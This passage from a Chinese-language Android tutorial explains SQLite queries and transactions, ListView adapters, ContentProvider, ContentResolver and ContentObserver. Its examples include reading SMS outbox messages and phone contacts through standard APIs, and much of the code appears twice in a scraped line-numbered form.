 
cursor
.
getColumnIndex
(
"name"
);
98
                
int
 
phoneindex
 
=
 
cursor
.
getColumnIndex
(
"phone"
);
99
                
String
 
name
 
=
 
cursor
.
getString
(
nameindex
);
100
                
String
 
phone
 
=
 
cursor
.
getString
(
phoneindex
);
101
                
person
.
setName
(
name
);
102
                
person
.
setNumber
(
phone
);
103
                
persons
.
add
(
person
);
104
            }
105
            
cursor
.
close
();
106
            
db
.
close
();
107
        }
108
        
return
 
persons
;
109
    }
110
 
111
}
query()方法实际上是把select语句拆分成了若干个组成部分，然后作为方法的输入参数：
SQLiteDatabase db = databaseHelper.getWritableDatabase();
Cursor cursor = db.query("person", new String[]{"personid,name,age"}, "name like ?", new String[]{"%传智%"}, null, null, "personid desc", "1,2");
while (cursor.moveToNext()) {
         int personid = cursor.getInt(0); //获取第一列的值,第一列的索引从0开始
        String name = cursor.getString(1);//获取第二列的值
        int age = cursor.getInt(2);//获取第三列的值
}
cursor.close();
db.close(); 
上面代码用于从person表中查找name字段含有“传智”的记录，匹配的记录按personid降序排序，对排序后的结果略过第一条记录，只获取2条记录。
query( table, columns, selection, selectionArgs, groupBy, having, orderBy, limit )方法各参数的含义：
table：表名。相当于select语句from关键字后面的部分。如果是多表联合查询，可以用逗号将两个表名分开。
columns：要查询出来的列名。相当于select语句select关键字后面的部分。
selection：查询条件子句，相当于select语句where关键字后面的部分，在条件子句允许使用占位符“?”
selectionArgs：对应于selection语句中占位符的值，值在数组中的位置与占位符在语句中的位置必须一致，否则就会有异常。
groupBy：相当于select语句group by关键字后面的部分
having：相当于select语句having关键字后面的部分
orderBy：相当于select语句order by关键字后面的部分，如：personid desc, age asc;
limit：指定偏移量和获取的记录数，相当于select语句limit关键字后面的部分。


使用SQLiteDatabase的 beginTransaction ()方法可以开启一个事务，程序执行到endTransaction() 方法时会检查事务的标志是否为成功，如果程序执行到endTransaction()之前调用了setTransactionSuccessful() 方法设置事务的标志为成功则提交事务，如果没有调用setTransactionSuccessful() 方法则回滚事务。使用例子如下： SQLiteDatabase db = ....;
db.beginTransaction();//开始事务 try {     db.execSQL("insert into person(name, age) values(?,?)", new Object[]{"传智播客", 4});     db.execSQL("update person set name=? where personid=?", new Object[]{"传智", 1});     db.setTransactionSuccessful();//调用此方法会在执行到endTransaction() 时提交当前事务，如果不调用此方法会回滚事务 } finally {     db.endTransaction();//由事务的标志决定是提交事务，还是回滚事务 }  db.close(); 

9
 
1
db
.
beginTransaction
();
//开始事务
2
try
 {
3
    
db
.
execSQL
(
"insert into person(name, age) values(?,?)"
, 
new
 
Object
[]{
"传智播客"
, 
4
});
4
    
db
.
execSQL
(
"update person set name=? where personid=?"
, 
new
 
Object
[]{
"传智"
, 
1
});
5
    
db
.
setTransactionSuccessful
();
//调用此方法会在执行到endTransaction() 时提交当前事务，如果不调用此方法会回滚事务
6
} 
finally
 {
7
    
db
.
endTransaction
();
//由事务的标志决定是提交事务，还是回滚事务
8
} 
9
db
.
close
(); 



public class 
DbActivity 
extends 
Activity {


   
private 
ListView 
mListView
;

   private 
List<Person> 
persons
;

   private 
LayoutInflater 
inflater
; 
// 打气筒 ,充气泵


   
@Override

   
public void 
onCreate
(Bundle savedInstanceState) {

      
super
.onCreate(savedInstanceState)
;

      
// inflater 是系统的一个服务 初始化服务，把布局转换成view对象

      
inflater 
= (LayoutInflater) 
this

            
.getSystemService(
LAYOUT_INFLATER_SERVICE
)
;


      
setContentView(R.layout.
main
)
;

      
// 第一步得到 组件的id的引用

      
mListView 
= (ListView) 
this
.findViewById(R.id.
lv_all_person
)
;

      
PersonDBDao dao = 
new 
PersonDBDao(
this
)
;

      
persons 
= dao.findAll()
;


      
// 第二步 设置组件要显示的内容

      // listview 显示的东西 比较复杂,需要数据的适配器

      // mListView.setAdapter(new MyAdatper());

      
List<Map<String
, 
String>> data = 
new 
ArrayList<Map<String
, 
String>>()
;

      for 
(Person person : 
persons
) {


         HashMap<String
, 
String> map = 
new 
HashMap<String
, 
String>()
;

         
map.put(
"name"
, 
person.getName())
;

         
map.put(
"age"
, 
person.getAge() + 
""
)
;

         
data.add(map)
;

      
}

      

      String [] personarr = 
new 
String[
persons
.size()]
;

      for
(
int 
i=
0
;
i<
persons
.size()
;
i++){

         personarr[i]= 
persons
.get(i).getName()
;

      
}


      
//1. mListView.setAdapter(new MyAdatper);   自定义的adatper

      //2.mListView.setAdapter(new SimpleAdapter(DbActivity.this, data, R.layout.item,new String[]{"name","age"}, new int[]{R.id.tv_name,R.id.tv_age}));

      //一个item只有一条数据的时候用ArrayAdapter

      //3.mListView.setAdapter(new ArrayAdapter<String>(DbActivity.this, R.layout.item, R.id.tv_name, personarr));

      

      
mListView
.setOnItemClickListener(
new 
OnItemClickListener() {  
//为每个item绑定事件


         
/**

          * parent 代表的是当前的listview         view 代表的当前被点击条目对应的view对象

          * position当前条目在listview中的位置    id 行号 一般与position 相同的

          */

         
public void 
onItemClick
(AdapterView<?> parent
, 
View view
,

               int 
position
, long 
id) {

              
//方法1

              
TextView tv_name = (TextView)view.findViewById(R.id.
tv_name
)
;

              
String name =tv_name.getText().toString()
; 
Toast.
makeText
(DbActivity.
this,
name
, 
Toast.
LENGTH_LONG
).show()
;

            
/*

             * 方法2 String name = persons.get(position).getName();

             * Toast.makeText(DbActivity.this, name, Toast.LENGTH_LONG).show();

             */


            
Person object = (Person) parent.getItemAtPosition(position)
;

            
String name = object.getName()
;

            
Toast.
makeText
(DbActivity.
this, 
name
, 
Toast.
LENGTH_LONG
).show()
;

         
}

      })
;


   
}


   
// BaseAdapter 是 google的工程师 给ListAdapter的默认实现

   
public class 
MyAdatper 
extends 
BaseAdapter {

      
/**

       * 返回当前listview有多少个条目

       */

      
public int 
getCount
() {

         
return 
persons
.size()
;

      
}


      
/**

       * 返回当前position位置对应的条目 的object对象

       */

      
public 
Object 
getItem
(
int 
position) {

         
return 
persons
.get(position)
;

      
}


      
/**

       * 返回当前position位置 某个条目的id

       */

      
public long 
getItemId
(
int 
position) {

         
return 
position
;

      
}


      
/**

       * 返回每一个条目显示的具体内容

       * 

       * 计算当前界面 会有多少个条目出现

       * 1.得到每一个textview的高度 2.得到listview的高度

       * 3.listview高度/textview高度 = 得到了一个屏幕显示的textview的个数

       * 

       * listview的每一个条目的显示 都需要调用一次getview的方法 屏幕上有多个item显示 就会调用多少getview的方法

       * parent 代表的是当前的这个listview，一个技巧：通过下断点可以知道里面的参数是什么

       */

      
public 
View 
getView
(
int 
position
, 
View convertView
, 
ViewGroup parent) {

         
/*

          * TextView tv = new TextView(DbActivity.this);   //参数要传上下文对象，不能用this，因为这里是内部类

          * //tv.setText("我是第"+position+"个文本");

          */

         
View view = 
inflater
.inflate(R.layout.
item
, null
)
;

         
Person person = 
persons
.get(position)
;

         
TextView tv_age = (TextView) view.findViewById(R.id.
tv_age
)
;

         
TextView tv_name = (TextView) view.findViewById(R.id.
tv_name
)
;

         
tv_age.setText(
"年龄为 " 
+ person.getAge())
;

         
tv_name.setText(
"姓名:" 
+ person.getName())
;

         
System.
out
.println(
"我被调用了 " 
+ position)
;

         return 
view
;


      
}

   }

}


<?xml version="1.0" encoding="utf-8"?> <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"     android:layout_width="match_parent"     android:layout_height="wrap_content" >       <TextView         android:id="@+id/tv_name"         android:layout_width="wrap_content"         android:layout_height="wrap_content"         android:layout_alignParentLeft="true"         android:text="xingming"         android:textColor="#ffff66ff"         android:textSize="18sp" />       <TextView         android:id="@+id/tv_age"         android:layout_width="wrap_content"         android:layout_height="wrap_content"         android:layout_alignParentRight="true"         android:text="age"         android:textColor="#ffff66ff"         android:textSize="18sp" />   </RelativeLayout>

24
 
1
<?
xml
 
version
=
"1.0"
 
encoding
=
"utf-8"
?>
2
<
RelativeLayout
 
xmlns
:
android
=
"http://schemas.android.com/apk/res/android"
3
    
android
:
layout_width
=
"match_parent"
4
    
android
:
layout_height
=
"wrap_content"
 
>
5
 
6
    
<
TextView
7
        
android
:
id
=
"@+id/tv_name"
8
        
android
:
layout_width
=
"wrap_content"
9
        
android
:
layout_height
=
"wrap_content"
10
        
android
:
layout_alignParentLeft
=
"true"
11
        
android
:
text
=
"xingming"
12
        
android
:
textColor
=
"#ffff66ff"
13
        
android
:
textSize
=
"18sp"
 
/>
14
 
15
    
<
TextView
16
        
android
:
id
=
"@+id/tv_age"
17
        
android
:
layout_width
=
"wrap_content"
18
        
android
:
layout_height
=
"wrap_content"
19
        
android
:
layout_alignParentRight
=
"true"
20
        
android
:
text
=
"age"
21
        
android
:
textColor
=
"#ffff66ff"
22
        
android
:
textSize
=
"18sp"
 
/>
23
 
24
</
RelativeLayout
>
---------------------------------使用ContentProvider（内容提供者）共享数据--------------------------
ContentProvider 在android中的作用是 对外共享数据 ，也就是说你可以通过ContentProvider把应用中的数据共享给其他应用访问， 其他应用可以通过ContentProvider 对你应用中的数据进行添删改查。 关于数据共享，以前我们学习过文件操作模式，知道通过指定文件的操作模式为Context.MODE_WORLD_READABLE 或Context.MODE_WORLD_WRITEABLE同样也可以对外共享数据。那么，这里为何要使用ContentProvider 对外共享数据呢？是这样的，如果采用文件操作模式对外共享数据， 数据的访问方式会因数据存储的方式而不同，导致数据的访问方式无法统一 ，如：采用xml文件对外共享数据，需要进行xml解析才能读取数据；采用sharedpreferences共享数据，需要使用sharedpreferences API读取数据。
使用ContentProvider对外共享数据的好处是统一了数据的访问方式。
1. 把自己应用的数据暴露给别的应用.
屏蔽数据库 底层操作的细节.
暴露uri  和要更改的数据.
当应用需要通过ContentProvider对外共享数据时，第一步需要继承ContentProvider并重写下面方法：
public class PersonContentProvider extends ContentProvider {
   public boolean onCreate()
   public Uri insert(Uri uri, ContentValues values)
   public int delete(Uri uri, String selection, String[] selectionArgs)
   public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)
   public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)
   public String getType(Uri uri)}
第二步需要在 AndroidManifest.xml使用<provider> 对该ContentProvider进行配置，为了能让其他应用找到该ContentProvider ， ContentProvider 采用了 authorities （主机名/域名）对它进行唯一标识，你可以把 ContentProvider看作是一个网站（想想，网站也是提供数据者），authorities 就是他的域名：
<manifest .... >
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <provider android:name=".PersonContentProvider" android:authorities="cn.itcast.providers.personprovider"/>
    </application>
</manifest>


Uri代表了要操作的数据，Uri主要包含了两部分信息：1》需要操作的ContentProvider ，2》对ContentProvider中的什么数据进行操作，一个Uri由以下几部分组成：


ContentProvider（内容提供者）的scheme已经由Android所规定， scheme为：content://
主机名（或叫Authority）用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。
路径（path）可以用来表示我们要操作的数据， 路径的构建应根据业务而定 ，如下:
要操作person表中id为10的记录，可以构建这样的路径:/person/10
要操作person表中id为10的记录的name字段， person/10/name
要操作person表中的所有记录，可以构建这样的路径:/person
要操作xxx表中的记录，可以构建这样的路径:/xxx
当然要操作的数据不一定来自数据库，也可以是文件、xml或网络等其他存储方式，如下:
要操作xml文件中person节点下的name节点，可以构建这样的路径：/person/name
如果要把一个字符串转换成Uri，可以使用Uri类中的parse()方法，如下：
Uri uri = Uri.parse ("content://cn.itcast.provider.personprovider/person")


----------------------  UriMatcher 类使用介绍---------------------
因为Uri代表了要操作的数据，所以我们经常需要解析Uri，并从Uri中获取数据。Android系统提供了两个用于操作Uri的工具类，分别为 UriMatcher 和 ContentUris 。掌握它们的使用，会便于我们的开发工作。
UriMatcher类用于匹配Uri，它的用法如下：
首先第一步把你需要匹配Uri路径全部给注册上，如下：
//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码
UriMatcher  sMatcher = new UriMatcher(UriMatcher.NO_MATCH);
//如果match()方法匹配content://cn.itcast.provider.personprovider/person路径，返回匹配码为1
sMatcher.addURI(“cn.itcast.provider.personprovider”, “person”, 1);//添加需要匹配uri，如果匹配就会返回匹配码
//如果match()方法匹配content://cn.itcast.provider.personprovider/person/230路径，返回匹配码为2
sMatcher.addURI(“cn.itcast.provider.personprovider”, “person/#”, 2);//#号为通配符
switch (sMatcher.match(Uri.parse("content://cn.itcast.provider.personprovider/person/10"))) { 
   case 1
    break;
   case 2
    break;
   default://不匹配
    break;
}
注册完 需要匹配的Uri后，就可以使用sMatcher.match(uri)方法对输入的Uri进行匹配，如果匹配就返回匹配码，匹配码是调用addURI()方法传入的第三个参数，假设匹配content://cn.itcast.provider.personprovider/person路径，返回的匹配码为1


--------------------------ContentUris类使用介绍---------------------------
ContentUris类用于获取Uri路径后面的ID部分，它有两个比较实用的方法：
withAppendedId(uri, id)用于为路径加上ID部分：
Uri uri = Uri.parse("content://cn.itcast.provider.personprovider/person")
Uri resultUri = ContentUris .withAppendedId (uri, 10); 
//生成后的Uri为：content://cn.itcast.provider.personprovider/person/10


parseId(uri)方法用于从路径中获取ID部分：
Uri uri = Uri.parse("content://cn.itcast.provider.personprovider/person/10")
long personid = ContentUris. parseId (uri);//获取的结果为:10


---------------------------使用ContentProvider共享数据-------------------------
ContentProvider类主要方法的作用：
public boolean onCreate()
该方法在ContentProvider创建后就会被调用， Android开机后， ContentProvider在其它应用第一次访问它时才会被创建。
public Uri insert(Uri uri, ContentValues values)
该方法用于供外部应用往ContentProvider添加数据。
public int delete(Uri uri, String selection, String[] selectionArgs)
该方法用于供外部应用从ContentProvider删除数据。
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)
该方法用于供外部应用更新ContentProvider中的数据。
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)
该方法用于供外部应用从ContentProvider中获取数据。
public String getType(Uri uri)
该方法用于返回当前Url所代表数据的 MIME 类型。如果操作的数据属于集合类型，那么MIME类型字符串应该以vnd.android.cursor. dir /开头，例如：要得到所有person记录的Uri为content://cn.itcast.provider.personprovider/person，那么返回的MIME类型字符串应该为：“vnd.android.cursor.dir/person”。如果要操作的数据属于非集合类型数据，那么MIME类型字符串应该以vnd.android.cursor. item /开头，例如：得到id为10的person记录，Uri为content://cn.itcast.provider.personprovider/person/10，那么返回的MIME类型字符串应该为：“vnd.android.cursor.item/person”。


------------------------------使用 ContentResolver 操作ContentProvider中的数据----------------------------
当外部应用需要对ContentProvider中的数据进行添加、删除、修改和查询操作时，可以使用ContentResolver 类来完成，要获取ContentResolver 对象，可以使用Activity提供的 getContentResolver ()方法。 ContentResolver 类提供了与ContentProvider类相同签名的四个方法：
public Uri insert(Uri uri, ContentValues values)
该方法用于往ContentProvider添加数据。
public int delete(Uri uri, String selection, String[] selectionArgs)
该方法用于从ContentProvider删除数据。
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs)
该方法用于更新ContentProvider中的数据。
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)
该方法用于从ContentProvider中获取数据。


这些方法的第一个参数为Uri，代表要操作的ContentProvider和对其中的什么数据进行操作，假设给定的是： Uri.parse(“content://cn.itcast.providers.personprovider/person/10”)，那么将会对主机名为cn.itcast.providers.personprovider的ContentProvider进行操作，操作的数据为person表中id为10的记录。


public class PersonProvider extends ContentProvider { // 创建了一个路径的识别器 uriMatcher 默认的返回值,如果没有找到匹配的类型  返回 -1; public static final UriMatcher matcher = new UriMatcher(UriMatcher.NO_MATCH); public static final int ALL_PERSONS = 1; public static final int PERSON = 2; public static final int HAHA =3; public static final int INSERT =4; public static final int DELETE =5; public static final int UPDATE =6; private static final String TAG = "PersonProvider"; MyDBOpenHelper openHelper; Uri baseuri = Uri.parse("content://cn.itcast.db.personprovider"); static { matcher.addURI("cn.itcast.db.personprovider", "persons", ALL_PERSONS); // 指定一个路径的匹配规则  //如果路径 满足 content://cn.itcast.db.provider/persons 返回值就是( ALL_PERSONS) 1  matcher.addURI("cn.itcast.db.personprovider", "person/#",PERSON ); //如果路径 满足 content://cn.itcast.db.provider/person/10 返回值就是( PERSON) 2 matcher.addURI("cn.itcast.db.personprovider", "haha", HAHA); matcher.addURI("cn.itcast.db.personprovider", "insert", INSERT); matcher.addURI("cn.itcast.db.personprovider", "delete", DELETE); matcher.addURI("cn.itcast.db.personprovider", "update", UPDATE);  }   /** * PeronProvder 内容提供者第一次被创建的时候 调用的方法  */ @Override public boolean onCreate() { openHelper = new MyDBOpenHelper(getContext()); return false; }  @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { int result = matcher.match(uri); switch (result) { // 符合 content://cn.itcast.db.provider/persons 代表的返回所有的数据  case ALL_PERSONS: PersonDBDao dao = new PersonDBDao(getContext()); return  dao.findAllbyCursor(); //content://cn.itcast.db.provider/person/10 case PERSON: long id = ContentUris.parseId(uri);  SQLiteDatabase db = openHelper.getReadableDatabase(); if(db.isOpen()){ Cursor cursor = db.query("person", null, "personid=?", new String[]{id+""}, null, null, null); return cursor; }  case HAHA: Log.i(TAG,"我是haha对应的路径 "); break; default: throw new IllegalArgumentException("uri 不能被识别 "); } return null; }  /** * 有的时候 我们需要知道内容提供者返回的数据类型  * 知道返回的数据 是一个集合呀 还是一个单独的条目  *  * 有的时候 告诉调用者 返回的数据是什么样的类型  * mime的数据类型 */ @Override public String getType(Uri uri) { int result = matcher.match(uri); switch (result) { // 符合 content://cn.itcast.db.provider/persons 代表的返回所有的数据  case ALL_PERSONS: return "vnd.android.cursor.dir/person"; //content://cn.itcast.db.provider/person/10 case PERSON: return "vnd.android.cursor.item/person"; default : return null; } }  @Override public Uri insert(Uri uri, ContentValues values) { // content://cn.itcast.db.provider/insert int result = matcher.match(uri);		  switch (result) { case INSERT: SQLiteDatabase db = openHelper.getWritableDatabase(); db.insert("person", "personid", values); // 当数据发生改变的时候  getContext().getContentResolver().notifyChange(baseuri, null); return uri; default: throw new IllegalArgumentException("uri 不能被识别 "); } }  @Override public int delete(Uri uri, String selection, String[] selectionArgs) { int result = matcher.match(uri);  switch (result) { case DELETE: SQLiteDatabase db = openHelper.getWritableDatabase(); getContext().getContentResolver().notifyChange(baseuri, null); return db.delete("person", selection, selectionArgs); default: throw new IllegalArgumentException("uri 不能被识别 "); } }  @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { int result = matcher.match(uri);  switch (result) { case UPDATE: SQLiteDatabase db = openHelper.getWritableDatabase(); getContext().getContentResolver().notifyChange(baseuri, null); return db.update("person", values, selection, selectionArgs);  default: throw new IllegalArgumentException("uri 不能被识别 "); } }  }

132
 
1
public
 
class
 
PersonProvider
 
extends
 
ContentProvider
 {
2
    
// 创建了一个路径的识别器 uriMatcher 默认的返回值,如果没有找到匹配的类型  返回 -1;
3
    
public
 
static
 
final
 
UriMatcher
 
matcher
 
=
 
new
 
UriMatcher
(
UriMatcher
.
NO_MATCH
);
4
    
public
 
static
 
final
 
int
 
ALL_PERSONS
 
=
 
1
;
5
    
public
 
static
 
final
 
int
 
PERSON
 
=
 
2
;
6
    
public
 
static
 
final
 
int
 
HAHA
 
=
3
;
7
    
public
 
static
 
final
 
int
 
INSERT
 
=
4
;
8
    
public
 
static
 
final
 
int
 
DELETE
 
=
5
;
9
    
public
 
static
 
final
 
int
 
UPDATE
 
=
6
;
10
    
private
 
static
 
final
 
String
 
TAG
 
=
 
"PersonProvider"
;
11
    
MyDBOpenHelper
 
openHelper
;
12
    
Uri
 
baseuri
 
=
 
Uri
.
parse
(
"content://cn.itcast.db.personprovider"
);
13
    
static
 {
14
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"persons"
, 
ALL_PERSONS
);
15
    
    
// 指定一个路径的匹配规则 
16
    
    
//如果路径 满足 content://cn.itcast.db.provider/persons 返回值就是( ALL_PERSONS) 1 
17
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"person/#"
,
PERSON
 );
18
    
    
//如果路径 满足 content://cn.itcast.db.provider/person/10 返回值就是( PERSON) 2
19
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"haha"
, 
HAHA
);
20
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"insert"
, 
INSERT
);
21
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"delete"
, 
DELETE
);
22
    
    
matcher
.
addURI
(
"cn.itcast.db.personprovider"
, 
"update"
, 
UPDATE
);
    
23
    
    
24
    
}
25
    
26
    
27
    
/**
28
    
 
* PeronProvder 内容提供者第一次被创建的时候 调用的方法 
29
    
 
*/
30
    
@Override
31
    
public
 
boolean
 
onCreate
() {
32
    
    
openHelper
 
=
 
new
 
MyDBOpenHelper
(
getContext
());
33
    
    
return
 
false
;
34
    
}
35
36
    
@Override
37
    
public
 
Cursor
 
query
(
Uri
 
uri
, 
String
[] 
projection
, 
String
 
selection
,
38
    
    
    
String
[] 
selectionArgs
, 
String
 
sortOrder
) {
39
    
    
int
 
result
 
=
 
matcher
.
match
(
uri
);
40
    
    
switch
 (
result
) {
41
    
    
// 符合 content://cn.itcast.db.provider/persons 代表的返回所有的数据 
42
    
    
case
 
ALL_PERSONS
:
43
    
    
    
PersonDBDao
 
dao
 
=
 
new
 
PersonDBDao
(
getContext
());
44
    
    
    
return
  
dao
.
findAllbyCursor
();
45
    
    
//content://cn.itcast.db.provider/person/10
46
    
    
case
 
PERSON
:
47
    
    
    
long
 
id
 
=
 
ContentUris
.
parseId
(
uri
);
48
    
49
    
    
    
SQLiteDatabase
 
db
 
=
 
openHelper
.
getReadableDatabase
();
50
    
    
    
if
(
db
.
isOpen
()){
51
    
    
    
    
Cursor
 
cursor
 
=
 
db
.
query
(
"person"
, 
null
, 
"personid=?"
, 
new
 
String
[]{
id
+
""
}, 
null
, 
null
, 
null
);
52
    
    
    
    
return
 
cursor
;
53
    
    
    
}
54
    
    
    
55
    
    
case
 
HAHA
:
56
    
    
    
Log
.
i
(
TAG
,
"我是haha对应的路径 "
);
57
    
    
    
break
;
58
    
    
default
:
59
    
    
    
throw
 
new
 
IllegalArgumentException
(
"uri 不能被识别 "
);
60
    
    
}
61
    
    
return
 
null
;
62
    
}
63
64
    
/**
65
    
 
* 有的时候 我们需要知道内容提供者返回的数据类型 
66
    
 
* 知道返回的数据 是一个集合呀 还是一个单独的条目 
67
    
 
* 
68
    
 
* 有的时候 告诉调用者 返回的数据是什么样的类型 
69
    
 
* mime的数据类型
70
    
 
*/
71
    
@Override
72
    
public
 
String
 
getType
(
Uri
 
uri
) {
73
    
    
int
 
result
 
=
 
matcher
.
match
(
uri
);
74
    
    
switch
 (
result
) {
75
    
    
// 符合 content://cn.itcast.db.provider/persons 代表的返回所有的数据 
76
    
    
case
 
ALL_PERSONS
:
77
    
    
    
return
 
"vnd.android.cursor.dir/person"
;
78
    
    
//content://cn.itcast.db.provider/person/10
79
    
    
case
 
PERSON
:
80
    
    
    
return
 
"vnd.android.cursor.item/person"
;
81
    
    
default
 :
82
    
    
    
return
 
null
;
83
    
    
}
84
    
}
85
86
    
@Override
87
    
public
 
Uri
 
insert
(
Uri
 
uri
, 
ContentValues
 
values
) {
88
    
    
// content://cn.itcast.db.provider/insert
89
    
    
int
 
result
 
=
 
matcher
.
match
(
uri
);
    
    
 
90
    
    
switch
 (
result
) {
91
    
    
case
 
INSERT
:
92
    
    
    
SQLiteDatabase
 
db
 
=
 
openHelper
.
getWritableDatabase
();
93
    
    
    
db
.
insert
(
"person"
, 
"personid"
, 
values
);
94
    
    
    
// 当数据发生改变的时候 
95
    
    
    
getContext
().
getContentResolver
().
notifyChange
(
baseuri
, 
null
);
96
    
    
    
return
 
uri
;
97
    
    
default
:
98
    
    
    
throw
 
new
 
IllegalArgumentException
(
"uri 不能被识别 "
);
99
    
    
}
100
    
}
101
102
    
@Override
103
    
public
 
int
 
delete
(
Uri
 
uri
, 
String
 
selection
, 
String
[] 
selectionArgs
) {
104
    
    
int
 
result
 
=
 
matcher
.
match
(
uri
);
105
    
    
106
    
    
switch
 (
result
) {
107
    
    
case
 
DELETE
:
108
    
    
    
SQLiteDatabase
 
db
 
=
 
openHelper
.
getWritableDatabase
();
109
    
    
    
getContext
().
getContentResolver
().
notifyChange
(
baseuri
, 
null
);
110
    
    
    
return
 
db
.
delete
(
"person"
, 
selection
, 
selectionArgs
);
111
    
    
default
:
112
    
    
    
throw
 
new
 
IllegalArgumentException
(
"uri 不能被识别 "
);
113
    
    
}
114
    
}
115
116
    
@Override
117
    
public
 
int
 
update
(
Uri
 
uri
, 
ContentValues
 
values
, 
String
 
selection
,
118
    
    
    
String
[] 
selectionArgs
) {
119
    
    
int
 
result
 
=
 
matcher
.
match
(
uri
);
120
    
    
121
    
    
switch
 (
result
) {
122
    
    
case
 
UPDATE
:
123
    
    
    
SQLiteDatabase
 
db
 
=
 
openHelper
.
getWritableDatabase
();
124
    
    
    
getContext
().
getContentResolver
().
notifyChange
(
baseuri
, 
null
);
125
    
    
    
return
 
db
.
update
(
"person"
, 
values
, 
selection
, 
selectionArgs
);
126
127
    
    
default
:
128
    
    
    
throw
 
new
 
IllegalArgumentException
(
"uri 不能被识别 "
);
129
    
    
}
130
    
}
131
132
}



public class OtherActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super .onCreate(savedInstanceState);
        setContentView(R.layout.main);
        
        ContentResolver  resolver =  getContentResolver();
        Uri uri = Uri.parse( "content://cn.itcast.db.personprovider/" );
        
//        Cursor cursor = resolver.query(uri, null, null, null, null);
//        while (cursor!=null&& cursor.moveToNext()){
//            String name = cursor.getString( cursor.getColumnIndex("name"));
//            int age = cursor.getInt(cursor.getColumnIndex("age"));
//            System.out.println("姓名 "+ name +" 年龄 "+ age);
//        }
        
        //  content://cn.itcast.db.personprovider
        // 注册了一个内容观察者 
        getContentResolver(). registerContentObserver (uri, true , new MyObserver( new Handler()));
    }
    
    
    public class MyObserver extends ContentObserver {

        public MyObserver(Handler handler) {
            super (handler);
           
        }

        /**
         * 当内容观察者发现了数据发生改变的时候 调用的方法 
         */
        @Override
        public void onChange( boolean selfChange) {
            System.out.println( "数据发生改变了 " );
            super .onChange(selfChange);
        }
       
    }
}



public class DemoActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        Uri uri = Uri.parse( "content://sms/" );
        getContentResolver().registerContentObserver(uri, true, new SmsObserver( new Handler()));
    }
    
    public class SmsObserver extends ContentObserver{

        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            System.out.println( "有新的短信产生 " );
            Cursor cursor = getContentResolver().query(Uri.parse( "content://sms/outbox" ),null, null, null, null); 
            while (cursor.moveToNext()){
                StringBuilder sb = new StringBuilder ();
                sb.append( "_id=" ).append(cursor.getInt(cursor.getColumnIndex( "_id" )));
                sb.append( ",address=" ).append(cursor.getString(cursor.getColumnIndex( "address" )));
                sb.append( ";body=" ).append(cursor.getString(cursor.getColumnIndex( "body" )));
                sb.append( ";time=" ).append(cursor.getLong(cursor.getColumnIndex( "date" )));
                System.out.println(sb.toString());
            }
            super.onChange(selfChange);
           
        }
    }
}
----------------------------
如果ContentProvider的访问者需要知道ContentProvider中的数据发生了变化，可以在ContentProvider 发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者，例子如下：
public class PersonContentProvider extends ContentProvider {
public Uri insert(Uri uri, ContentValues values) {
db.insert("person", "personid", values);
getContext().getContentResolver().notifyChange(uri, null);
}
}
如果ContentProvider的访问者需要得到数据变化通知，必须使用 ContentObserver 对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：
getContentResolver().registerContentObserver(Uri.parse("content://cn.itcast.providers.personprovider/person"),
        true, new PersonObserver(new Handler()));
public class PersonObserver extends ContentObserver{
public PersonObserver(Handler handler) {
super(handler);
  }
public void onChange(boolean selfChange) {
   //此处可以进行相应的业务处理
}
}
-----------------------------------
使用ContentResolver对通信录中的数据进行添加、删除、修改和查询操作：
加入读写联系人信息的 权限
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />





public class TestContact extends AndroidTestCase {

    public void getAllContactInfo() throws Exception{
        String rawbase = "content://com.android.contacts/raw_contacts" ;
        String database = "content://com.android.contacts/data" ;
        Cursor cursor = getContext().getContentResolver().query(Uri.parse(rawbase), null, null, null, null);
        while (cursor.moveToNext()) {
           
            String id   = cursor.getString( cursor.getColumnIndex( "_id" ));
            System.out.println( "id =" + id);
           
            Cursor datacursor = getContext().getContentResolver().query(Uri.parse(database), null, "raw_contact_id=?" , new String[]{id}, null);
            while (datacursor.moveToNext()) {
               
//                String[]  names = datacursor.getColumnNames();
//                for(int i =0;i<names.length;i++){
//                    System.out.println(names[i]);
//                }

                String type = datacursor.getString(datacursor.getColumnIndex( "mimetype" ));
                System.out.println(type);
               
                if ( "vnd.android.cursor.item/email_v2" .equals(type)){
                    String data1 = datacursor.getString( datacursor.getColumnIndex( "data1" ));
                    System.out.println( "邮箱 " + data1);
                } else if ( "vnd.android.cursor.item/name" .equals(type)){
                    String data1 = datacursor.getString( datacursor.getColumnIndex( "data1" ));
                    System.out.println( "姓名 " + data1);
                } else if ( "vnd.android.cursor.item/phone_v2" .equals(type)){
                    String data1 = datacursor.getString( datacursor.getColumnIndex( "data1" ));
                    System.out.println( "电话号码 " + data1);
                }
               
            }
            datacursor.close();
       
        }
        cursor.close();
    }
   
   
    public void writeContact() throws Exception{
        String rawbase = "content://com.android.contacts/raw_contacts" ;
         ContentValues values = new ContentValues();
         Uri  uri = getContext().getContentResolver().insert(Uri.parse(rawbase), values);
          //返回的raw_contact 表中的_id
         long id = ContentUris.parseId(uri);
         
